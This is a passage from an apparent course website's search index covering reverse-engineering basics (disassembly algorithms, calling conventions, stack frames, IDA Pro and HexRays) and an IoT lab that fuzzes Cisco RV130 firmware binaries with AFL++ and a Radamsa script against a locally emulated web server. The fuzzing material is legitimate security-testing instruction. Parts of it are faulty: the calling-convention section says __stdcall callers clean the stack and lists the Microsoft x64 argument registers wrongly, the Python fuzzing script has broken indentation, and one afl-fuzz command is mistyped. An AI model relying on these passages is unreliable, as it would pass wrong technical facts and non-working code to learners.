each other. Therefore, we can easily translate the machine code back to assembly language, and such a process is called disassembly.</p> <p>As mentioned in Section 5.1.2, the assembly process also has information loss. Although we can easily parse and restore the content of a given instruction, we must know which data is machine code before we can parse it accordingly. The von Neumann architecture blurs the boundary of distinction between code and data, and jump tables, pools of constants (ARMs), ordinary constant data, and even malicious interference data may be interspersed in code sections. Therefore, simply and directly parsing instructions down one by one in succession is often problematic. We need to know the correct starting position of the instruction (e.g., label, which is used to indicate a location of the program for jumping and addressing) to guide the disassembly tool to parse the code correctly.</p> <p>As mentioned above, the label information is lost during the assembly process. Because the label is used to identify the jump position, it determines where the program is likely to be executed when it is executed, i.e., where the assembly statement starts. Therefore, restoring the correct label information is essential to correctly restore the program execution flow.</p> <p>In spite of the missing information, we can still successfully restore the program flow by using some algorithms. Two known algorithms are described below: the linear scan disassembly algorithm and the recursive descent disassembly algorithm.</p> <p>The linear scan disassembly algorithm is simple and brute-force, parsing instructions one after another directly from the beginning of the code segment until the end. The disadvantage is that once data is inserted into the segment, all subsequent disassembly results are wrong and useless.</p> <p>Instead of simply parsing the instructions and displaying them, the recursive descent disassembly algorithm is a new algorithm created after discovering the problems with the linear scan disassembly algorithm, which tries to speculate how the program will be executed after each instruction is executed. For example, a normal instruction will execute directly to the next one after execution, an unconditional jump instruction will immediately jump to the target location, a function call instruction will temporarily jump out and return to continue execution, a return instruction will terminate the current execution process, and a conditional jump instruction may split into two paths that go to different locations under different conditions. The engine first matches some known patterns (patterns) to the starting position, then traces the execution of the program one by one according to the execution pattern of the instructions, and finally disassembles the program completely.</p> <p>4. Calling convention</p> <p>As the size of the software increases, the number of developers continues to increase, the relationship between functions synchronization becomes more and more complex, if each developer uses different rules to pass function parameters, the program will often be a variety of unbelievable errors, the program maintenance costs will become very large. For this reason, after the advent of compilers, some conventions, called calling conventions, were created for compilers to specify the passing of arguments between functions. The common calling conventions are as follows.</p> <p>(1) Calling convention for x86 32-bit architecture</p> <p>\u2756 __cdecl: parameters are pressed onto the stack in order from right to left, and when the call is finished, the caller is responsible for cleaning up these pressed parameters and placing the return value in EAX. The vast majority of C programs for x86 platforms use this convention.</p> <p>\u2756 __stdcall: The arguments are also pressed onto the stack from right to left, and the caller is responsible for cleaning up the pressed arguments after the call, with the return value also placed in EAX.</p> <p>\u2756 __thiscall: A calling convention optimized specifically for class methods, which places the this pointer of the class method in the ECX register and then presses the rest of the arguments onto the stack.</p> <p>\u2756\\ __fastcall: A calling convention made for speeding up calls by placing the 1st argument in ECX, placing the 2nd argument in EDX, and then pressing the subsequent arguments onto the stack from right to left.</p> <p>(2) Calling convention for x86 64-bit architecture</p> <p>\u2756 Microsoft x64 bit (x86-64) calling convention: used on Windows, the first 4 parameters are put into the 4 registers RDI, RSI, RDX, RCX in turn, and then the remaining parameters are pressed into the stack from right to left.</p> <p>\u2756 SystemV x64 calling convention: used on Linux, MacOS, two more registers than Microsoft's version, use the 6 registers RDI, RSI, RDX, RCX, R8, R9 to pass the first 6 parameters, and press the rest on the stack from right to left.</p> <p>5. Local variables</p> <p>When writing programs, programmers often use local variables. But in assembly there are only registers, stacks, writable segments and heaps, where should the local variables of a function exist? It is important to note that local variables are \"volatile\": once the function returns, all local variables become invalid. Given this property, local variables are stored on the stack, and each time a function is called, the program allocates a section of space on the stack to store the local variables.</p> <p>Each function, when called, creates such a region for local variables, a region for storing return addresses, and a region for arguments, see Figure 5-1-2. The program calls the function one layer deeper, and each function's own region is stacked on the stack one layer at a time.</p> <p></p> <p>People call this area of each function itself a frame, and because these frames are on the stack, they are also called stack frames. However, the memory area of the stack is not necessarily fixed, and the location of the stack frames can vary with each call's path, so how can local variables be referenced correctly?</p> <p>While the contents of the stack will always keep changing as it goes in and out of the stack, the offset of each local variable in a function relative to the stack frame of that function is fixed. So a register can be introduced to specifically store the location of the current stack frame, i.e., ebp, called the frame pointer. The program assigns ebp to a location in the middle of the stack frame during the function initialization phase, so that all local variables can be referenced with ebp. Since the parent function on the upper level also has to use ebp, it is necessary to save ebp at the beginning of the function and then assign ebp to the value of its own stack frame, such a flow is the classic combination in assembly code.</p> <p></p> <p>The stack frame of each function now consists of four parts: local variables, the value of the parent stack frame, the return address, and the parameters. It can be seen that ebp, after initialization, actually points to the location where the address of the parent stack frame is stored. Therefore, *ebp forms a chain table representing a chain of function calls at one level.</p> <p>With the development of compilation technology, the compiler can also refer to local variables by tracking the location of the stack at the time of each instruction execution, thus directly crossing over ebp and using the stack pointer esp instead. This saves the time needed to save ebp each time and adds a general-purpose register, thus improving program performance.</p> <p>So now there are two kinds of functions: those with frame pointers, and those optimized without frame pointers. Modern analysis tools (e.g. IDA Pro, etc.) will use advanced stack pointer tracing methods to target these two types of functions so that local variables are handled correctly.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#introduction-to-common-tools","title":"Introduction to common tools","text":"<p>This section introduces the tools commonly used in software reverse engineering, the specific use of tools will be described in subsequent sections.</p> <p>1. IDA Pro</p> <p>IDA (Interactive DisAssembler) Pro (hereinafter referred to as IDA) is a powerful executable analysis tool, including but not limited to x86/x64, ARM, MIPS and other architectures, PE, ELF and other formats of executable files for static analysis and dynamic debugging. IDA integrated Hex-Rays Decompiler, which provides decompiling functions from assembly language to C pseudocode, can greatly reduce the workload when analyzing the program, its interface is shown in Figure 5-1-3 and Figure 5-1-4.</p> <p></p> <p></p> <p>2. OllyDbg and x64dbg</p> <p>OllyDbg is an excellent debugger for Windows 32-bit environment and its most powerful feature is its extensibility. Many developers have developed plug-ins for it with various functions that can bypass many software protection measures. However, OllyDbg is no longer available in the 64-bit environment, and many people have therefore turned to x64dbg.</p> <p>The interfaces of OllyDbg and x64dbg are shown in Figure 5-1-5 and Figure 5-1-6.</p> <p></p> <p></p> <p>3. GNU Binary Utilities</p> <p>The GNU Binary Utilities (binutils) is a chain of tools provided by GNU for binary file analysis. the tools included are shown in Table 5-1-4. Figure 5-1-7 and Figure 5-1-8 show examples of simple applications of the tools in binutils.</p> <p></p> <p></p> <p></p> <p>4. GDB</p> <p>GDB (GNU Debugger) is a command-line debugger provided by GNU, with powerful debugging functions and source-level debugging support for programs containing debugging symbols, as well as support for writing extensions using the Python language, and the extension plug-ins generally used are gdb-peda, gef or pwndbg. Figure 5-1-10 shows the command line interface when using the gef plugin.</p> <p></p> <p></p> <p></p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#static-analysis","title":"Static Analysis","text":"<p>The most basic method of reverse engineering is static analysis, i.e., instead of running the binary program, various information such as machine instructions in the program files are analyzed directly. At present, the most commonly used tool for static analysis is IDA Pro. This section introduces the general method of static analysis based on the use of IDA Pro.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#getting-started-with-lda","title":"Getting Started with lDA","text":"<p>The code file required for this section is 1-helloworld.</p> <p>1. open the file</p> <p>IDA Pro is one of the industry's most mature and advanced disassembly tools, using a recursive descent disassembly algorithm, this section will initially introduce the use of IDA Pro.</p> <p>IDA's interface is very simple, after installation will pop up the license agreement (License) window, follow the interface prompts to enter the Quick Start interface, see Figure 5-2-1.</p> <p></p> <p>In the interface, click the \"New\" button, and in the pop-up dialog box to select the file to open, you can also click the \"Go\" button, and then drag and drop the file into the open interface, or by clicking the \" Previous\" button, double-click the list item, etc. to quickly open the previously opened file.</p> <p>Note that you need to select the correct architecture version (32bit/64bit) before opening the file. Users can use tools such as file to view the architecture information of the file, but a more convenient solution is to open a random architecture of IDA, and then you can know the architecture information of the file when loading, see Figure 5-2-2, IDA shows that the file is an x86-64 architecture ELF64 file, so switch to the 64bit version of IDA to open again, after opening the pop-up will be \"Load a new file\" dialog box.</p> <p></p> <p>2. Load a file</p> <p>The options in the \"Load a new file\" dialog box are mainly for advanced users, beginners can use the default settings, do not need to change, click the \"OK\" button, load the file into the IDA. Click the \"No\" button to enter the normal disassembly interface. At this point, IDA will generate a database (IDB) for the file, the entire file required content into it, see Figure 5-2-3. later analysis will no longer need to access the input file, the various changes to the database will also be independent of the input file.</p> <p>The interface in Figure 5-2-3 is divided into several parts, which are described below.</p> <p>\u2756 Navigation bar: Shows the distribution of different types of data (ordinary functions, code of undefined functions, data, undefined, etc.) of the program.</p> <p>\u2756 Main window of disassembly: Displays the result of disassembly, control flow diagram, etc., which can be dragged, selected, etc.</p> <p>\u2756 Function window: displays all function names and addresses (drag the scroll bar below to see them), and can be filtered by Ctrl+F key combination.</p> <p>\u2756 Output window: display the log of IDA during running, you can also enter commands in the input box below and execute them.</p> <p>\u2756 Status Indicator: Showing as \"AU: idle\" means IDA has finished the automated analysis of the program.</p> <p>In the disassembly window, use the right-click menu or the shortcut key space to switch between control flow diagram and text interface disassembly, see Figure 5-2-4.</p> <p></p> <p></p> <p>3. Data Type Operation</p> <p>One of the highlights of IDA is that the user can freely control the flow of disassembly through interface interaction. In the process of loading the file, IDA has done its best to automatically define the type of a large number of locations for the user, such as IDA correctly labeled most of the data in the code segment as code type and disassembled it, and labeled some of the locations in the special segment as 8-byte integer qword. however, IDA's ability is limited and generally does not correctly label all data types, and the user can correct the problems with IDA by correctly defining the type of a 1-byte or segment area for better disassembly work.</p> <p>Lower versions of IDA do not have an undo function, so you need to be careful before operating and to master the opposite operation corresponding to these operations.</p> <p>The user can distinguish the type of data in a location by the color of the address. The location marked as code, its address will be shown in black; the location marked as data, gray display; undefined data type location will be shown in yellow, black box location that is the different color address, see Figure 5-2-5.</p> <p></p> <p>The following are some of the shortcut keys for the defined data types. When using these shortcut keys, you need to have the focus (cursor) on the corresponding line in order for them to take effect.</p> <p>\u2756 U (Undefine) key: This is to cancel the existing data type definition in a place, and a confirmation dialog box will pop up.</p> <p>\u2756 D (Data) key: i.e., make a certain position into data. IDA to prevent misuse, if the operation of defining data will affect the location of the existing data type, IDA will pop up a confirmation dialog box; if the operation of location and its vicinity are completely Undefined, the confirmation dialog box will not pop up.</p> <p>\u2756 C (Code) key: i.e., make a location into a command. The timing of the confirmation dialog pop-up is also similar to the D key. After being defined as a command, IDA will automatically use this as the starting position for recursive descending disassembly.</p> <p>Above are the basic shortcuts for defining data. To cope with the increasing complexity of data types, IDA also has various built-in data types, such as arrays, strings, etc.</p> <p>\u2756 A (ASCII) key: It will define a string type ending with \"\\0\" starting from this position, see Figure 5-2-6.</p> <p></p> <p>\u2756 * key: Define this as an array, and then a dialog box will pop up to set the properties of the array.</p> <p>\u2756 O (Offset) key: Define this as an address offset, see Figure 5-2-7.</p> <p></p> <p>4. Function Operation</p> <p>In fact, disassembly is not completely continuous, but rather a patchwork of scattered individual functions. Each function has local variables, calling conventions and other information, and control flow diagrams can only be generated and displayed in terms of functions, so it is also very important to define functions correctly. IDA also has operations for handling functions.</p> <p>\u2756 Delete a function: After selecting a function in the function window, press Delete.</p> <p>\u2756 Define a function: After selecting the corresponding line in the disassembly window, press P.</p> <p>\u2756 Modify function parameters: Select and press the Ctrl+E key combination in the function window, or press Alt+P key combination inside the function in the disassembly window.</p> <p>After defining the function, IDA can perform many function-level analyses, such as call convention analysis, stack variable analysis, function call parameter analysis, etc. These analyses are of direct and great help to restore the high-level semantics of disassembly.</p> <p>5. Navigation</p> <p>Although it is possible to switch between different functions by mouse clicks, as the size of the program increases, it seems unrealistic to use this way to locate them. \u00ee IDA has the function of navigation history, similar to Explorer and browser history, which allows you to go back or forward to a certain browsing place.</p> <p>\u2756 Go back to the previous location: shortcut Esc.</p> <p>\u2756 Go forward to the next location: shortcut Ctrl+Enter.</p> <p>\u2756 Jump to a specific location: shortcut G, then you can enter the address/already defined name.</p> <p>\u2756 Jump to a particular zone: shortcut Ctrl+S, and then you can select the zone.</p> <p>6. Type manipulation</p> <p>IDA has developed a type analysis system to handle various data types (function declarations, variable declarations, structure declarations, etc.) of C/C++ language and allows users to specify them freely. This definitely makes the reduction of disassembly more accurate. Select the variable, function and press Y, \"Please enter the type declaration\" dialog box, enter the correct C type, IDA can parse and automatically apply the type.</p> <p>7. IDA mode of operation</p> <p>IDA shortcut key design has a certain pattern, so we can strengthen the memory of the shortcut key, so that the reverse speed faster and more comfortable.</p> <p>Here are some operation patterns and learning techniques summarized in the usual practice.</p> <p>\u2756 Various operations in IDA's disassembly window will have different functions when selected and when unselected. For example, the operation corresponding to the shortcut key C can specify the scan area for recursive descending disassembly when the disassembly window is selected.</p> <p>\u2756 Some of the shortcut keys in IDA's disassembly window have different functions when used multiple times. For example, the shortcut key O will resume the first operation when used a second time on the same location.</p> <p>\u2756 IDA's right-click shortcut menu will be labeled with various shortcut keys.</p> <p>\u2756 IDA's dialog box buttons can be replaced by mouse clicks by pressing their initials (e.g. the \"Yes\" button can be replaced by mouse clicks by pressing the Y key).</p> <p>We can master these patterns to quickly learn IDA shortcuts, and basically do not need to press the control keys (Ctrl, Alt, Shift) shortcut features make IDA operation more interesting.</p> <p>8. IDAPython</p> <p>IDAPython is a Python environment built into IDA, you can perform a variety of database operations through the interface, it can now execute most of the C++ functions in the IDA SDK and all IDC functions, it can be said to have both the convenience of IDC and the power of the C++SDK.</p> <p>Press Alt+F7 key combination, or select \"File\u2192Script file\" menu command, you can execute Python script files; output window also has a Python Console box, you can temporarily execute Python statements; press Shift+F2 key combination, or Select the \"File\u2192Script command\" menu command to open the script panel, and change \"Scripting language\" to \"Python \", you can get a simple editor, see Figure 5-2-8.</p> <p></p> <p>9 IDA's other functions</p> <p>IDA's menu bar \"View\u2192Open subviews\" can open various types of windows, see Figure 5-2-9.</p> <p></p> <p>Strings window: press Shift+F12 to open it, see Figure 5-2-10, you can identify the strings in the program, double-click to locate the target string in the disassembly window.</p> <p></p> <p>Hexadecimal window: Opened by default, you can press F2 to modify the data in the database, and press F2 again to apply the changes after modification.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#getting-started-with-hexrays-decompiler","title":"Getting Started with HexRays Decompiler","text":"<p>The basic operations of IDA introduced in section 5.2.1 are to allow IDA to correctly identify the data types and functions of a location. These operations partially restore the information loss caused by the linker and assembler mentioned in the executable (see section 2.4.7). The decompiler presented in this section will try to restore the information loss caused by the compiler and continue to restore the functions composed of these assembly instructions to a read-friendly form. Therefore, getting the decompiler to work correctly requires the correct definition of data types and the correct identification of functions.</p> <p>This section introduces HexRays Decompiler (HexRays for short), the world's most advanced and sophisticated decompiler that is publicly available. HexRays runs as a plug-in to IDA and is developed by the same company as IDA and has a strong connection to IDA. hexRays makes full use of the function local variables and data types determined by IDA, and generates C-like pseudocode after optimization. Users can browse the generated pseudocode, add comments, rename identifiers, modify variable types, switch the data display format, etc.</p> <p>1. generate pseudocode</p> <p>To use this plug-in, you need to let it generate pseudocode. The operation required to generate pseudocode is very simple, just locate the target function in the disassembly window and press the F5 key. Once the plug-in is running, a window will open showing the decompiled pseudocode, see Figure 5-2-11. Selecting the list of functions on the left side allows you to switch to a different function without returning to the disassembly window.</p> <p>When the cursor moves to identifiers, keywords, and constants, the same content in other positions will be highlighted for easy viewing and operation.</p> <p>2. Pseudocode Composition</p> <p>The pseudocode generated by HexRays has a certain structure. After decompiling each function, the first line is the prototype of the function, then the declaration area of local variables, and finally the statements of the function.</p> <p>The upper part of this is the variable declaration area. Sometimes the area for larger functions can be too long to read and can be collapsed by clicking \"Collapse declaration\".</p> <p>Note that the comments following each local variable actually represent the location of that variable. This information will make it easier to understand the behavior of the corresponding assembly code.</p> <p>In addition, most of the variable names in the pseudocode are automatically generated and may vary from machine to machine or from version to version of IDA.</p> <p>3. Modify Identifiers</p> <p>Looking at the IDA generated pseudocode 2-simpleCrackme.c (see Figure 5-2-12), you can see that HexRays is very powerful and has automatically named many variables. However, the names of these variables have no real meaning, and as the size of the function becomes larger, meaningless variable names will seriously affect the analysis efficiency. Therefore, HexRays provides users with the ability to change the name of an identifier: move the cursor to the identifier and press N to bring up the Change Name dialog box, enter a legal name in the input box, and click the OK button. The modified pseudo-code is easier to read and analyze.</p> <p></p> <p>Note: IDA generally allows the use of identifiers in line with the C language syntax, but will be used as a reservation of certain prefixes, in the manual specification of the name, such a prefix can not be used, please readers are prompted to change the name after being prompted for errors.</p> <p>4. switch the data display format</p> <p>After renaming, the 2-simpleCrackme.c pseudocode has been restored to be similar to the source code (see Figure 5-2-12). However, many constants are not displayed in the correct format, for example, 0x66 in the source code becomes decimal number 102, and 'a' and 'A' are converted to their ASCII counterparts of decimal numbers 97 and 65.</p> <p></p> <p>HexRays is not powerful enough to automatically label these constants, but HexRays provides the ability to display constants into various formats. Move the cursor over a constant and right-click to select the corresponding format in the pop-up shortcut menu, see Figure 5-2-13.</p> <p></p> <p>\u2756 Hexadecimal: Hexadecimal display, with the shortcut key H, can convert various other display formats back to numbers.</p> <p>\u2756 Octal: Octal display.</p> <p>\u2756 Char: Converts constants to a format shaped like 'A', the shortcut key is R.</p> <p>\u2756 Enum: Converts a constant to a value in an enumeration, the shortcut key is M.</p> <p>\u2756 Invert sign: convert a constant to a negative number by its complement, the shortcut key is _.</p> <p>\u2756 Bitwise negate: Invert the constant by bit, like ~0xF0 in C language, the shortcut key is ~. After the manual operation to convert some display format, the decompiled pseudocode is more consistent with the source code, see Figure 5-2-14.</p> <p></p> <p>HexRays shortcuts are sometimes not triggered, try using the right-click shortcut menu when it fails.</p> <p>5. Modifying Variable Types</p> <p>The companion file to this section is 2-simpleCrackme_O3. After compiler optimization, the difficulty of recovering the semantics increases exponentially. Even though HexRays are extremely powerful, they often have problems in the face of complex compiler optimizations.</p> <p>This section uses the executable generated by compiling with the GCC compiler with the O3 optimization switch turned on. The same source code undergoes a complex compiler optimization process and the resulting pseudocode can change quite a bit, see Figure 5-2-15.</p> <p></p> <p>The pseudocode converts some constants at the beginning to display format, which is the middle part of the string in the program stored as dword and qword, respectively. In fact, the original string assignment operation has become 128-bit floating-point assignment + 64-bit qword assignment + 32-bit dword assignment. HexRays thus identifies the string array as three variables: v6 of type __m128i, v7 of __int64, and v8 of int, resulting in poor readability of the pseudocode generated later.</p> <p>Hint: byte-1 byte integer type, 8 bits, char, __int8.</p> <p>word-2 byte integer, 16 bits, short, __int16.</p> <p>dword-4-byte integer, 32 bits, int, __int32.</p> <p>qword-8-byte integer, 64 bits, __int64, long long.</p> <p>The variables v6, v7, v8 are actually entire arrays of strings. If the user can correctly specify the type of the variables, the accuracy and readability of decompiling will be greatly improved.</p> <p>HexRays makes full use of the type analysis system of IDA introduced earlier. Press Y on the identifier of the type to be modified to bring up a dialog box to modify the type. For this program, according to the calculation, the 3 variables should actually be a char array of length 28 (16+8+4) starting with v6, so its corresponding C type declaration is char[28] (the identifier can be omitted in the type declaration).</p> <p>Then move the cursor to v6, press Y, type \"char[28]\", and a confirmation dialog box will pop up whether to overwrite the subsequent variables, click the \"Yes\" button.</p> <p>Rename these variables again, and you can get the readable pseudo-code, see Figure 5-2-16.</p> <p></p> <p>HexRays supports not only type modification of local variables, but also parameter types, function prototypes, global variable types, and so on. In fact, HexRays supports not only these simple types, but also C types such as structures and enumerations. Press Shift+F1 key combination to bring up the Local Types window, from which you can manipulate various types of C: press Insert, or right-click to bring up the Add Type dialog box, see Figure 5-2-17, from which you can enter a type that conforms to the simple syntax of C, and then IDA will parse and store the type. In addition, press Ctrl+F9 key combination or select \"File\u2192Load File\u2192Parse C header file\" menu command, you can load the C language header file.</p> <p></p> <p>After adding custom types, HexRays will automatically perform the corresponding parsing operations according to the types when setting variable types, such as displaying access to structures, displaying enumerations, etc.</p> <p>Various cases of type recognition errors may occur during the reverse process, and we need to use our experience in C programming to set variables such as structures, normal pointers, structure pointers, and integers correctly.</p> <p>In general, HexRays can increase the length of a variable by force (e.g., char[28] as mentioned above), but when changing a long variable to a short one, the alarm will often be \"Sorry, can not change variable type\" (e.g., change char[28] above to char[27]), so you need to be careful when changing a long variable to a shorter one. If you inadvertently modify the error, you can delete the function and then define the function to reset the various information of the function</p> <p>6. Complete the analysis</p> <p>After fine-tuning the pseudo-code to a level suitable for your reading, you can start the analysis. Obviously, this program implements the imitation projection cipher, and the method of finding the inverse is very simple, so I will not repeat it, and ask the reader to complete the decryption by himself.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/","title":"Lab 6: IoT Security and Wireless Exploitation","text":"<p>AFL lives at https://lcamtuf.coredump.cx/afl/. It hasn't been updated in a while. While AFL still works fine, there's a new project AFL++, a fork of AFL with lots of improvements and new features. AFL++ can be found at https://aflplus.plus/ with its source on GitHub. This article will look at using AFL++ to fuzz IoT binaries.</p> <p>Fuzzing works best when we have the source code of the binary in question. Unfortunately for IoT binaries, this is often not the case. AFL++ (and AFL) ships with a companion tool (afl-gcc, afl-clang, etc) that works as a drop-in replacement to gcc, clang, or any other standard build tool. The tool is used to inject instrumentation in the generated binaries while compiling the source code. The instrumented binaries can then be fuzzed using afl-fuzz.</p> <p>Fuzzing closed-source applications is tricky. For fuzzing such binaries, AFL++ can use Qemu, unicorn, or Frida and are named qemu mode, unicorn mode, and Frida mode respectively. These are binary-only instrumentation modes and are not as efficient as the source code instrumentation modes. We will be using Qemu mode in this article.</p> <p>In Qemu mode, AFL++ uses qemu user mode emulation to run the binary. It uses a modified version of Qemu which instruments the basic blocks as the program executes. The instrumentation information thus generated is used to generate new test cases which trigger different code paths improving code coverage. AFL++ in qemu mode can also be used to instrument foreign arch binaries (like an arm binary on an x86_64 host). This is extremely useful for fuzzing IoT firmware binaries which are usually of ARM or MIPS architecture.</p> <p>An important point to note is that AFL++ and similar fuzzers (AFL, hongfuzz, radamsa[test case generator only]) only work with file inputs That is the program must only receive the fuzzed input from a file. Programs that take in input from a socket are not supported.</p> <p>For fuzzing socket-based programs we can take either of the following approaches:</p> <ul> <li>If the application's source code is available, rewrite the application to accept input from a file. Most of the time rewriting the entire application isn\u2019t necessary. We can code in a small test function that reads in a file and uses the data to call another function that we want to fuzz.</li> <li>For closed-source apps, rewriting the source isn\u2019t an option. In such cases, there are hacks to convert a socketed binary to use files instead. These methods usually use LD_PRELOAD to override socket functions and make them read/write from a file instead. Preeny and desockmulti are two such desocketing tools. However, these may not always work out of the box.</li> </ul>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#compiling-afl","title":"Compiling AFL++","text":"<p>AFL++ can be compiled on any Linux system. Here we are using an Ubuntu 20.04 LXD container. The steps are as follows:</p> <pre><code>$ sudo apt update\n$ sudo apt install git make build-essential clang ninja-build pkg-config libglib2.0-dev libpixman-1-dev\n$ git clone https://github.com/AFLplusplus/AFLplusplus\n$ cd AFLplusplus/\n$ make all\n$ cd qemu_mode\n$ CPU_TARGET=arm ./build_qemu_support.sh\n</code></pre>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-simple-iot-binaries","title":"Fuzzing simple IoT binaries","text":"<p>We will be using a firmware for the Cisco RV130 VPN router which can be downloaded from https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.55?i=!pp. The file is named RV130X_FW_1.0.3.55.bin</p> <p>After extracting the binary using binwalk the extracted file system looks like</p> <p>Extracted filesystem of Cisco RV130X firmware binary</p> <p>We will be looking at fuzzing the jsonparse and xmlparser1 binary in /usr/sbin/. These programs accept input from a file and are ideal for fuzzing. We don\u2019t have the source available so we have to use Qemu mode.</p> <p></p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-xmlparser1","title":"Fuzzing xmlparser1","text":"<p>Before fuzzing we need to know how the program accepts input. Running xmlparser1 with qemu-arm-static with the \u2013help parameter shows the usage. It accepts a filename with the -f parameter. The -d parameter stands for debugging.</p> <p></p> <p>We can create a test XML file and run xmlparser1.</p> <p></p> <p>xmlparser1 displays the parsed contents of the test.xml file. We may now proceed to fuzz. To run the fuzzer we need to give an input file that the fuzzer will use to generate further test cases. We will specify test.xml as our input file.</p> <p>Create two directories input-xml and output-xml and move the test.xml file to input-xml as shown.</p> <p></p> <p>We can now launch afl-fuzz</p> <p></p> <pre><code>$ QEMU_LD_PREFIX=./squashfs-root/ ../AFLplusplus/afl-fuzz \\\n            -Q \\\n            -i input-xml/ \\\n            -o output-xml/ \\\n            -- ./squashfs-root/usr/sbin/xmlparser1 -f @@\n</code></pre> <p>The options are explained below:</p> <ul> <li>-Q: Use AFL++ in Qemu mode</li> <li>-i: The path to the input directory</li> <li>-o: The path to the output directory. This directory will contain files that trigger an interesting behavior on the binary such as a crash or hang</li> </ul> <p>Everything after the double hyphen (--) specifies the target program to run along with its arguments. The @@ parameter stands for the filename. At runtime, AFL++ will replace the @@ parameter with the name of the input file.</p> <p>The fuzzing session starts as shown below. We can press Ctrl+C anytime to exit.</p> <p></p> <p>In our brief test, AFL++ wasn\u2019t able to crash the application.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-jsonparse","title":"Fuzzing jsonparse","text":"<p>Jsonparse is a similar binary but it parses JSON files instead of XML. Running the program without any arguments displays its usage.</p> <p></p> <p>We can create a test JSON file and run jsonparser on it.</p> <p></p> <p>We can use the same test.json file as input to the fuzzer. In a similar way, create two directories named input-json and output-json with test.json in directory input-json.</p> <p></p> <p>We can run the fuzzer as shown:</p> <p></p> <pre><code>$ QEMU_LD_PREFIX=./squashfs-root/ ../AFLplusplus/afl-fuzz \\\n            -Q \\\n            -i input-json / \\\n            -o output-json / \\\n            -- ./squashfs-root/usr/sbin/jsonparser @\n</code></pre> <p>After fuzzing for a couple of minutes, there are two unique crashes already.</p> <p></p> <p>Let\u2019s explore the output-json directory to have a look at the files which crashed jsonparser.</p> <p></p> <p>The two files which triggered the crashes are in the output-json/default/crashes directory.</p> <p></p> <p></p> <p>To cross-check, we can run jsonparser with one of the generated files.</p> <p></p> <p>Jsonparser indeed crashes with a segfault. From here on, the next steps are to identify the root cause of the bug and check if it's exploitable. Not all crashes are exploitable. Triaging the crash is out of the scope of this post.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-web","title":"Fuzzing web","text":"<p>In this post, we will be looking at socketed binaries. Fuzzing binaries that communicate over the network using sockets are different from fuzzing binaries that use file-based I/O. Vanilla AFL and AFL++ don\u2019t support fuzzing socketed binaries although there have been projects such as AFLNet and AFLNW which use modified versions of AFL for the same. Here, however, we will see how to use plain AFL++ to fuzz network programs. The <code>httpd</code> binary at <code>/usr/sbin/httpd</code> is the web server for the firmware and can be used as a candidate for fuzzing.</p> <p>We can launch <code>httpd</code> with <code>sudo</code> as shown. Sudo is needed to bind on port 80.</p> <p></p> <p>Note that qemu is started from within the <code>www/</code> directory as this is where the web resources (html, css, js files) are. Although it shows a bind error, running <code>netstat</code> confirms that <code>httpd</code> is indeed listening on port 80.</p> <p></p> <p>We can open http://127.0.0.1 to cross-check that the web interface is accessible.</p> <p></p> <p>The web interface can also be accessed using <code>curl</code>.</p> <p></p> <p>Using an intercepting proxy such as Burp Suite, we can view the actual HTTP requests that are being sent. Trying to log in to the dashboard with the credentials <code>admin:123456</code> results in a POST request as shown.</p> <p></p> <p>In the image above we are running the webserver over port 8080 (rather than 80)  by appending <code>-p 8080</code> to the qemu command line.</p> <p>From here on, the idea is to modify this base request using the fuzzer in subtle ways such that it crashes the web server.</p> <p>The naive way is to send actual requests over the network. However, this would be slow. The smarter and recommended way is to make the webserver read the HTTP request data from a file. We will look at both ways.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#naive-fuzzing-using-radamsa","title":"Naive fuzzing using Radamsa","text":"<p>Radamsa is not a fuzzer. It's a test case generator that reads in a file and modifies it in subtle ways. How to use the modified output is up to us. Here we will send the output from the file to the running web server.</p> <pre><code># fuzz-radamsa.py\nimport socket\nimport pyradamsa\n\nbase_login_request = open(\"base-login-request.txt\", \"rb\").read()\n\nrad = pyradamsa.Radamsa()\ni = j = 0\n\nwhile True:\n    # Create a modified request based on the base request\n    fuzzed_request = rad.fuzz(base_login_request)\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    # 1 second timeout\n    sock.settimeout(1)\n\n    sock.connect((\"127.0.0.1\", 8080))\n\n    j += 1\n    print(f\"[+] Request {j} - \", end=\"\")\n\n    sock.sendall(fuzzed_request)\n    try:\n            sock.recv(50000)\n        print(\"OK\")\n    except Exception as ex:\n            i += 1\n            open(f\"interesting/{i}.txt\", \"wb\").write(fuzzed_request)\n            print(f\" {ex} -&gt; saved to {i}.txt\")\n       sock.close()\n</code></pre> <p>The code above uses Radamsa to generate modified request data using the base login request. This data is then sent over the socket to the web server running at port 8080. If the server doesn\u2019t respond within 1 second, the input is saved to a file in the interesting directory.</p> <p>We can run the fuzzer as shown.</p> <p></p> <p>Request 3 timed out while responding and the corresponding input was saved to 1.txt. Note that a timeout is not the same as a crash. Had the server crashed on request 3, further requests wouldn\u2019t be successful. Fuzzing this way is highly inefficient, slow, and error-prone and would often lead to false positives.</p>"},{"location":"CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/#fuzzing-with-afl","title":"Fuzzing with AFL++","text":"<p>As discussed before, to fuzz with AFL, the program must accept input from a file. We do not have the source code of httpd which we can modify for our purpose. Hence we have to resort to binary-level modifications, such as patching the assembly instructions and <code>LD_PRELOAD</code> tricks. Using the latter we can override network functions in <code>libc</code> to make them accept input from a file instead. The desockmulti project on GitHub can be used for this purpose.</p> <p>Before showing how to use desockmulti, we need to make a few modifications of our own. The <code>httpd</code> binary currently forks to the background using the <code>daemon</code> function. We do not want this forking behavior during fuzzing.</p> <p></p> <p>We need to override the <code>daemon</code> such that it returns 0 without forking actually. This can be done both with LD_PRELOAD or by patching the assembly instructions.</p> <p>The other change that we need to make is to have httpd process exactly 1 request (unlike a typical web server that processes requests indefinitely) before 